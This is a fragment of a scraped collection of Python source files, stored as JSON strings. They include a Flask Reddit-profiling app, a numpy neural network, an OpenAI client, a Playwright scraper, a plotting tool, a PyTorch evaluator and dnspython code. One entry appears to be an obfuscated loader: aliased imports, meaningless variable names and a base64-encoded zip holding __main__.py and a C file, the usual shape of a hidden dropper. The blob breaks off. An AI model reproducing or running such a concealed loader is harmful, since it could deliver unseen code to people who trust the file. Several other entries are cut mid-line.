respons",
    "# app.py\n\nfrom flask import Flask, render_template, request, Response, redirect, url_for, flash, jsonify\nimport os\nimport threading\nimport uuid\nfrom dotenv import load_dotenv\n\nfrom reddit_scraper import scrape_reddit_user\nfrom gemini_processor import process_content\n\nfrom extensions import db, login_manager, bcrypt, migrate\nfrom models import User\nfrom forms import RegistrationForm, LoginForm\n\nfrom flask_login import login_user, current_user, logout_user, login_required\n\n# Load environment variables from .env file\nload_dotenv()\n\n# Initialize Flask app\napp = Flask(__name__)\napp.secret_key = os.getenv(\"SECRET_KEY\") or 'default_secret_key'  # Replace with a strong secret key\n\n# Configuration\napp.config['SQLALCHEMY_DATABASE_URI'] = os.getenv('DATABASE_URL') or 'sqlite:///site.db'\napp.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False\n\n# Initialize extensions with the app\ndb.init_app(app)\nlogin_manager.init_app(app)\nbcrypt.init_app(app)\nmigrate.init_app(app, db)\n\n# Configure LoginManager\nlogin_manager.login_view = 'login'  # Redirect to 'login' when login is required\nlogin_manager.login_message_category = 'info'\n\n# Global dictionary to track tasks\ntasks = {}\n\ndef background_task(username, task_id):\n    \"\"\"\n    Background task to scrape Reddit data and process it through Gemini API.\n    Updates the tasks dictionary with progress.\n    \"\"\"\n    try:\n        tasks[task_id]['progress'] = 'Scraping Reddit data...'\n        scraped_data = scrape_reddit_user(username, task_id, tasks)\n        if not scraped_data:\n            tasks[task_id]['progress'] = 'Failed to scrape Reddit data.'\n            tasks[task_id]['status'] = 'Failed'\n            return\n\n        tasks[task_id]['progress'] = 'Processing data through Gemini API...'\n        structured_report_path = process_content(username, scraped_data, task_id, tasks)\n        if not structured_report_path or not os.path.exists(structured_report_path):\n            tasks[task_id]['progress'] = 'Failed to process data with Gemini API.'\n            tasks[task_id]['status'] = 'Failed'\n            return\n\n        tasks[task_id]['progress'] = 'Report generated successfully.'\n        tasks[task_id]['status'] = 'Completed'\n        tasks[task_id]['report_path'] = structured_report_path\n\n    except Exception as e:\n        print(f\"Error in background task: {e}\")\n        tasks[task_id]['progress'] = 'An unexpected error occurred.'\n        tasks[task_id]['status'] = 'Failed'\n\ndef get_unique_task_id():\n    return uuid.uuid4().hex\n\n@app.route('/', methods=['GET', 'POST'])\n@login_required  # Require login for the main page\ndef index():\n    if request.method == 'POST':\n        reddit_username = request.form.get('reddit_username', '').strip()\n        if not reddit_username:\n            flash('Please enter a Reddit username.', 'danger')\n            return redirect(url_for('index'))\n\n        # Generate a unique task ID\n        task_id = get_unique_task_id()\n        tasks[task_id] = {\n            'progress': 'Task started.',\n            'status': 'In Progress',\n            'report_path': None,\n            'total_posts': 0,\n            'scraped_posts': 0,\n            'total_comments': 0,\n            'scraped_comments': 0\n        }\n\n        # Start background thread\n        thread = threading.Thread(target=background_task, args=(reddit_username, task_id))\n        thread.start()\n\n        flash('Your request is being processed. Please wait...', 'info')\n        return redirect(url_for('progress_page', task_id=task_id))\n\n    return render_template('index.html')\n\n@app.route('/progress/<task_id>', methods=['GET'])\n@login_required\ndef progress_page(task_id):\n    \"\"\"\n    Render the progress page with a progress bar.\n    \"\"\"\n    if task_id not in tasks:\n        flash('Invalid task ID.', 'danger')\n        return redirect(url_for('index'))\n    return render_template('progress.html', task_id=task_id)\n\n@app.route('/status/<task_id>', methods=['GET'])\n@login_required\ndef status(task_id):\n    \"\"\"\n    Endpoint to get the current status of the task.\n    \"\"\"\n    if task_id not in tasks:\n        return jsonify({'status': 'Invalid task ID.'}), 404\n\n    task = tasks[task_id]\n    total_posts = task.get('total_posts', 0)\n    scraped_posts = task.get('scraped_posts', 0)\n    total_comments = task.get('total_comments', 0)\n    scraped_comments = task.get('scraped_comments', 0)\n\n    return jsonify({\n        'status': task.get('status', 'Unknown'),\n        'progress': task.get('progress', ''),\n        'total_posts': total_posts,\n        'scraped_posts': scraped_posts,\n        'total_comments': total_comments,\n        'scraped_comments': scraped_comments\n    })\n\n@app.route('/download/<task_id>', methods=['GET'])\n@login_required\ndef download(task_id):\n    \"\"\"\n    Endpoint to download the generated report.\n    \"\"\"\n    if task_id not in tasks:\n        flash('Invalid task ID.', 'danger')\n        return redirect(url_for('index'))\n    if tasks[task_id]['status'] != 'Completed':\n        flash('Report is not ready yet.', 'warning')\n       ",
    "import numpy as np\n\n\ndef relu(x):\n    return np.maximum(x, 0)\n\n\ndef relu_derivative(x):\n    return (x > 0).astype(float)\n\n\ndef sigmoid(x):\n    return 1 / (1 + np.exp(-x))\n\n\ndef sigmoid_derivative(x):\n    s = sigmoid(x)\n    return s * (1 - s)\n\n\ndef cross_entropy(predicted, labels):\n    return -np.sum(labels * np.log(predicted)) / len(labels)\n\n\ndef softmax(x):\n    exp_x = np.exp(x - np.max(x, axis=1, keepdims=True))\n    return exp_x / np.sum(exp_x, axis=1, keepdims=True)\n\n\nclass Layer:\n    def __init__(self, input_dim, output_dim, activation=\"relu\"):\n        self.weights = np.random.random((output_dim, input_dim)) - 0.5\n        self.biases = np.zeros(output_dim)\n        self.a = np.zeros((output_dim, 1))\n        self.z = np.zeros((output_dim, 1))\n\n        activation_functions = {\"relu\": (relu, relu_derivative), \"sigmoid\": (sigmoid, sigmoid_derivative),\n                                \"softmax\": (softmax, None)}\n        self.activation, self.derivative = activation_functions[activation]\n\n    def forward(self, inputs):\n        self.z = inputs @ self.weights.T + self.biases\n        self.a = self.activation(self.z)\n\n\nclass DNN:\n    def __init__(self, architecture):\n        self.layers = architecture\n        self.n = self.layers[0].weights.shape[0]\n\n    def forward(self, inputs):\n        self.layers[0].forward(inputs)\n        for i in range(1, len(self.layers)):\n            self.layers[i].forward(self.layers[i-1].a)\n\n    def backprop(self, inputs, labels, alpha):\n        errors = self.layers[-1].a - labels\n\n        dldz = (2/self.n * errors) * self.layers[-1].derivative(self.layers[-1].z)\n        for i in range(len(self.layers)-1, -1, -1):\n            if i > 0:\n                dldw = (1 / self.n) * self.layers[i - 1].a.T @ dldz\n            else:\n                dldw = (1 / self.n) * inputs.T @ dldz\n            dldb = 1 / self.n * np.sum(dldz, axis=0)\n\n            self.layers[i].weights -= alpha * dldw.T\n            self.layers[i].biases -= alpha * dldb\n\n            if i > 0:\n                dldz = dldz @ self.layers[i].weights * self.layers[i - 1].derivative(self.layers[i - 1].z)\n\n    def train(self, inputs, labels, alpha, epochs):\n        for epoch in range(epochs):\n            self.forward(inputs)\n            error = self.layers[-1].a - labels\n            print((error ** 2).sum() / self.n)\n            self.backprop(inputs, labels, alpha)\n        print(self.layers[-1].a)\n\n\ntest_inputs = np.array([[1, 0], [0, 1], [1, 1], [0, 0]])\ntest_labels = np.array([[0], [0], [1], [1]])\n\narchitecture = [Layer(2, 2), Layer(2, 4), Layer(4, 1, activation=\"sigmoid\")]\nmyMLP = DNN(architecture)\nmyMLP.train(test_inputs, test_labels, 0.3, 10000)",
    "from dotenv import load_dotenv #this is loading the environment variables\nfrom openai import OpenAI #this is the SDK through which we can chat with openAI directly in Python\nimport os #OS or operating system package in python helps us achieve os related functions\n\nclass QueryOpenAi:\n    '''class to handle openAI queries'''\n    def __init__(self):\n        load_dotenv() #here we load environment variables in the .env file. The variable of importance for us is the open AI Key which allows us to chat with openAI safely.\n        self.client = OpenAI() #this creates a client which can talk to openAI\n    \n    def query_openai(self, prompt: str):\n        '''Function to query OpenAI's API'''\n        completion = self.client.chat.completions.create( #this function calls allows us ot send a query to openAI and get a response\n            model=\"gpt-4o\", # this is the LLM model we use for our answer\n            messages=[ #this list is what tells openAi the query to answer\n                {\"role\": \"system\", \"content\": \"You are a helpful assistant called Gerri.\"}, #role tells openAI what role it is playing.\n                {\n                    \"role\": \"user\", #now as a user you can ask the question listed in content\n                    \"content\": prompt\n                }\n            ],\n            stream=True #this is set to false so that we get the response in one go\n        )\n        for chunk in completion:\n            content = chunk.choices[0].delta.content\n            if content:\n                yield content\n\nif __name__ == \"__main__\":\n    query = QueryOpenAi()\n    for chunk in query.query_openai(\"What is the best way to save energy when using chatgpt?\"):\n        print(chunk, end='')  # Print each chunk as it arrives",
    "import asyncio\nfrom playwright.async_api import Playwright, async_playwright, expect\nfrom bs4 import BeautifulSoup\nimport pandas as pd\nimport time\nimport datetime\nfrom openpyxl import load_workbook\n\n\n# Update file path\nfile_path = r\"E:\\DjangoProject\\PlayWright\\4Beats\\Excel.xlsx\"\n\ndef day_name():\n    # Get today's date\n    today = datetime.date.today()\n\n    # Get the name of the day\n    day_name = today.strftime('%A')\n\n    print(day_name)\n\n    #Return the name of the day\n    return day_name\n\n\ndef read_my_excel_file():\n    df = pd.read_excel(file_path, sheet_name=day_name())\n    # df_rows = df.index.stop\n    # print(df)\n    # print(df_rows)\n\n    return df\n\ndef read_search_value():\n    df = read_my_excel_file()\n    # print(df)\n    # print(df['Search'].tolist())\n\n    return df['Search'].tolist()\n\n\ndef scrape_data(page_content):\n    soup = BeautifulSoup(page_content, 'html.parser')\n    # print(soup.prettify())\n    all_search = soup.find_all('div', class_='wM6W7d')\n\n    # print(all_search)\n    all_search_list = []\n\n    for div in all_search:\n        span_text = div.find('span').get_text()  # Find the <span> inside the <div> and get the text\n        all_search_list.append(span_text)\n\n    print(all_search_list)\n\n    # Use list comprehension to remove empty strings\n    filtered_data = [item for item in all_search_list if item != '']\n\n    # Print the filtered list\n    print(filtered_data)\n\n    # Use list comprehension with max to find the element with the maximum length\n    max_length_element = max(filtered_data, key=len)\n    min_length_element = min(filtered_data, key=len)\n\n    # Print the element with the maximum length\n    print(max_length_element)\n    print(min_length_element)\n\n    return max_length_element, min_length_element\n\n\n\ndef insert_searched_data(max_len_list, min_len_list):\n    df = read_my_excel_file()\n\n    # print(max_len_list, min_len_list)\n    # print(df['Longest Option'])\n    # print(df['Shortest Option'])\n    print(df)\n\n\n    # Assuming 'df' is your DataFrame\n    df = df.drop(columns=['Longest Option', 'Shortest Option'])\n\n    # Alternatively, you can use the `iloc` method to drop the last two columns:\n    # df = df.iloc[:, :-2]\n\n    # Check the DataFrame to confirm the columns are dropped\n    # print(df)\n\n    # Assuming 'df' is your existing DataFrame\n    df['Longest Option'] = max_len_list\n    df['Shortest Option'] = min_len_list\n\n    # Check the updated DataFrame\n    print(df)\n\n\n    # Open the Excel file and write to the existing sheet\n    with pd.ExcelWriter(file_path, engine='openpyxl', mode='a', if_sheet_exists='replace') as writer:\n        # Write the updated DataFrame to the existing sheet\n        df.to_excel(writer, sheet_name=day_name(), index=False)\n\n\nasync def run(playwright: Playwright) -> None:\n    max_len_list, min_len_list = [], []\n    search_list = read_search_value()\n \n    browser = await playwright.chromium.launch(headless=False)\n    context = await browser.new_context()\n    page = await context.new_page()\n\n    for search in search_list:\n        print(search)\n        await page.goto(\"https://www.google.com/\")\n        time.sleep(1)\n        await page.get_by_label(\"\u09b8\u09be\u09b0\u09cd\u099a \u0995\u09b0\u09c1\u09a8\", exact=True).click()\n        time.sleep(1)\n        await page.get_by_label(\"\u09b8\u09be\u09b0\u09cd\u099a \u0995\u09b0\u09c1\u09a8\", exact=True).fill(search)\n        time.sleep(2)\n\n\n        page_content = await page.content()\n        max_len, min_len = scrape_data(page_content)\n        # print(f'1. {max_len}\\n 2. {min_len}')\n        \n\n        max_len_list.append(max_len)\n        min_len_list.append(min_len)\n    \n\n    insert_searched_data(max_len_list, min_len_list)\n\n    \n\n    # ---------------------\n    await context.close()\n    await browser.close()\n\n\nasync def main() -> None:\n    async with async_playwright() as playwright:\n        await run(playwright)\n\n\nasyncio.run(main())",
    "import argparse\nimport logging\nimport os\nfrom dataclasses import dataclass\nfrom typing import Any\n\nimport matplotlib.patches as patches\nimport matplotlib.pyplot as plt\n\n\nlogging.basicConfig(\n    format=\"%(asctime)s %(levelname)-8s [%(filename)s:%(lineno)d] %(message)s\",\n    datefmt=\"%Y-%m-%d:%H:%M:%S\",\n    level=logging.INFO,\n)\n\n\n@dataclass\nclass Process:\n    pid: int\n    start_time: float\n    end_time: float\n    program: str\n    full_command: str\n\n\ndef get_ax_width_and_height_in_pixels(fig: Any, ax: Any) -> tuple[int, int]:\n    bbox = ax.get_window_extent().transformed(fig.dpi_scale_trans.inverted())\n    width, height = bbox.width, bbox.height\n    width_px = width * fig.dpi\n    height_px = height * fig.dpi\n    return width_px, height_px\n\n\ndef gen_text(p: Process, width_px: float, font_size: int) -> str:\n    # TODO: This is heuristic. We need to calculate the width of the text in\n    # pixels.\n    font_width_in_pixels = font_size * 1.0\n    n_chars = int(width_px / font_width_in_pixels) - 1\n\n    text = os.path.basename(p.program)\n    text += f\" ({int(p.end_time - p.start_time)} sec)\"\n    text += f\" (PID: {p.pid})\"\n    text += f\" (cmd: {p.full_command})\"\n\n    if width_px < 10:\n        return \"\"\n    elif len(text) <= n_chars:\n        n_repeat = n_chars // (len(text) + 1)\n        text = (text + \" \") * n_repeat\n        return text\n    else:\n        return text[:n_chars] + \"...\"\n\n\ndef gen_color_map(processes: list[Process]) -> dict[str, str]:\n    histogram: dict[str, float] = {}\n    for p in processes:\n        program_name = os.path.basename(p.program)\n        if program_name in histogram:\n            histogram[program_name] += p.end_time - p.start_time\n        else:\n            histogram[program_name] = p.end_time - p.start_time\n    colored_programs = list(histogram.items())\n    colored_programs.sort(key=lambda x: x[1], reverse=True)\n    color_list = [\n        \"red\",\n        \"orange\",\n        \"yellow\",\n        \"magenta\",\n        \"purple\",\n        \"blue\",\n        \"cyan\",\n        \"green\",\n    ]\n\n    color_map: dict[str, str] = {}\n    for i in range(min(len(colored_programs), len(color_list))):\n        color_map[colored_programs[i][0]] = color_list[i]\n    return color_map\n\n\ndef plot_processes(\n    *,\n    processes: list[Process],\n    image_file: str,\n    minimum_duration: int,\n    title: str,\n    width: int,\n    height: int,\n) -> None:\n    processes = list(\n        filter(lambda p: p.end_time > p.start_time + minimum_duration, processes)\n    )\n    processes.sort(key=lambda p: p.start_time)\n\n    offset_time = float(1 << 32)\n    max_time = 0.0\n    for p in processes:\n        s = p.start_time\n        e = p.end_time\n        offset_time = min(offset_time, s)\n        max_time = max(max_time, e)\n    logging.info(\n        f\"offset_time: {offset_time}, max_time: {max_time}, duration: {max_time - offset_time}\"\n    )\n\n    vcpu_used_times: list[float] = [0] * len(processes)\n    process_to_vcpu: list[int] = [-1] * len(processes)\n    for i, p in enumerate(processes):\n        for j in range(len(vcpu_used_times)):\n            if vcpu_used_times[j] <= p.start_time:\n                vcpu_used_times[j] = p.end_time\n                process_to_vcpu[i] = j\n                break\n    max_vcpu = max(process_to_vcpu) + 1\n    logging.info(f\"Maximal number of processes running concurrently: {max_vcpu}\")\n\n    # Matplotlib cannot set the size of the figure in pixels, so we need to set\n    # the size in inches and dpi.\n    fig, ax = plt.subplots(dpi=100, figsize=(width / 100, height / 100))\n\n    ax_width, ax_height = get_ax_width_and_height_in_pixels(fig, ax)\n    logging.debug(f\"The size of the axes in pixels: {ax_width} x {ax_height}\")\n\n    ax.set_xlim(0, max_time - offset_time)\n    ax.set_xlabel(\"Time (sec)\")\n    x_tick_interval = (width // 25) // 50 * 50  # heuristic\n    ax.set_xticks(range(0, int(max_time - offset_time), x_tick_interval))\n    ax.set_ylim(0, max_vcpu)\n    ax.set_yticks([])\n\n    program_to_color: dict[str, str] = gen_color_map(processes)\n\n    for i, p in enumerate(processes):\n        s = p.start_time - offset_time\n        e = p.end_time - offset_time\n        v = process_to_vcpu[i]\n        rectangle_width_in_pixels = ax_width / (max_time - offset_time) * (e - s)\n        rectangle_height_in_pixels = ax_height / max_vcpu\n\n        logging.debug(\n            f\"Process {p.pid} {p.program} {p.full_command} is plotted at ({s}, {v}) with width {rectangle_width_in_pixels} and height {rectangle_height_in_pixels}\"\n        )\n\n        program_name = os.path.basename(p.program)\n        r = patches.Rectangle(\n            (s, v),\n            e - s,\n            1.0,\n            facecolor=(\n                \"none\"\n                if program_name not in program_to_color\n                else program_to_color[program_name]\n            ),\n            edgecolor=\"black\",\n        )\n        ax.add_patch(r)\n\n        rx, ry = r.get_xy()\n        cx = rx + r.get_width() / 2.0\n        cy = ry + r.get_height() / 2.0\n\n        text = gen_text(p, rectangle_width_i",
    "E=' '\nB=''\nA=chr\nimport os as C,sys as D,base64 as H,tempfile as I\nJ='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",
    "import torch\nimport matplotlib.pyplot as plt\nfrom sklearn.metrics import confusion_matrix, ConfusionMatrixDisplay, precision_recall_fscore_support\nimport numpy as np\n\nclass Evaluate:\n    def evaluate_model(self, model, test_loader, device):\n        model.to(device)\n        model.eval()\n        correct = 0\n        total = 0\n        all_labels = []\n        all_predictions = []\n\n        class_names = test_loader.dataset.classes\n\n        with torch.no_grad():\n            for images, labels in test_loader:\n                images, labels = images.to(device), labels.to(device)\n                outputs = model(images)\n                _, predicted = torch.max(outputs, 1)\n\n                total += labels.size(0)\n                correct += (predicted == labels).sum().item()\n\n                all_labels.extend(labels.cpu().numpy())\n                all_predictions.extend(predicted.cpu().numpy())\n\n        accuracy = 100 * correct / total\n        print(f'Accuracy of the model on the test set: {accuracy:.2f}%')\n\n        cm = confusion_matrix(all_labels, all_predictions, labels=range(len(class_names)))\n\n        plt.figure(figsize=(25, 20)) \n\n        disp = ConfusionMatrixDisplay(confusion_matrix=cm, display_labels=class_names)\n        disp.plot(cmap=plt.cm.Blues, xticks_rotation=0, ax=plt.gca())\n        plt.title('Confusion Matrix (Results)', fontsize=18)\n        plt.xlabel('Predicted Label', fontsize=14)\n        plt.ylabel('True Label', fontsize=14)\n\n        plt.tight_layout()\n        plt.savefig('model_evaluation.png', dpi=300)\n        print(\"Evaluation plots saved as 'model_evaluation.png'\")\n        plt.show()\n\n        tp = cm.diagonal()  \n        fp = cm.sum(axis=0) - tp  \n        fn = cm.sum(axis=1) - tp  \n\n        precision = tp / (tp + fp)\n        recall = tp / (tp + fn)\n\n        precision = np.nan_to_num(precision, nan=0.0)\n        recall = np.nan_to_num(recall, nan=0.0)\n\n        overall_precision, overall_recall, overall_f1, _ = precision_recall_fscore_support(\n            all_labels, all_predictions, average='weighted', zero_division=0\n        )\n\n        print(\"\\nOverall Metrics:\")\n        print(f\"Precision: {overall_precision * 100:.2f}\")\n        print(f\"Recall: {overall_recall * 100:.2f}\")\n        print(f\"F1-Score: {overall_f1 * 100:.2f}\")\n\n        return accuracy, overall_precision, overall_recall, overall_f1\n",
    "# Copyright (C) Dnspython Contributors, see LICENSE for text of ISC license\n\n# Copyright (C) 2001-2017 Nominum, Inc.\n#\n# Permission to use, copy, modify, and distribute this software and its\n# documentation for any purpose with or without fee is hereby granted,\n# provided that the above copyright notice and this permission notice\n# appear in all copies.\n#\n# THE SOFTWARE IS PROVIDED \"AS IS\" AND NOMINUM DISCLAIMS ALL WARRANTIES\n# WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF\n# MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL NOMINUM BE LIABLE FOR\n# ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES\n# WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN\n# ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT\n# OF OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.\n\nimport base64\nimport struct\n\nimport dns.exception\nimport dns.immutable\nimport dns.rcode\nimport dns.rdata\n\n\n@dns.immutable.immutable\nclass TSIG(dns.rdata.Rdata):\n    \"\"\"TSIG record\"\"\"\n\n    __slots__ = [\n        \"algorithm\",\n        \"time_signed\",\n        \"fudge\",\n        \"mac\",\n        \"original_id\",\n        \"error\",\n        \"other\",\n    ]\n\n    def __init__(\n        self,\n        rdclass,\n        rdtype,\n        algorithm,\n        time_signed,\n        fudge,\n        mac,\n        original_id,\n        error,\n        other,\n    ):\n        \"\"\"Initialize a TSIG rdata.\n\n        *rdclass*, an ``int`` is the rdataclass of the Rdata.\n\n        *rdtype*, an ``int`` is the rdatatype of the Rdata.\n\n        *algorithm*, a ``dns.name.Name``.\n\n        *time_signed*, an ``int``.\n\n        *fudge*, an ``int`.\n\n        *mac*, a ``bytes``\n\n        *original_id*, an ``int``\n\n        *error*, an ``int``\n\n        *other*, a ``bytes``\n        \"\"\"\n\n        super().__init__(rdclass, rdtype)\n        self.algorithm = self._as_name(algorithm)\n        self.time_signed = self._as_uint48(time_signed)\n        self.fudge = self._as_uint16(fudge)\n        self.mac = self._as_bytes(mac)\n        self.original_id = 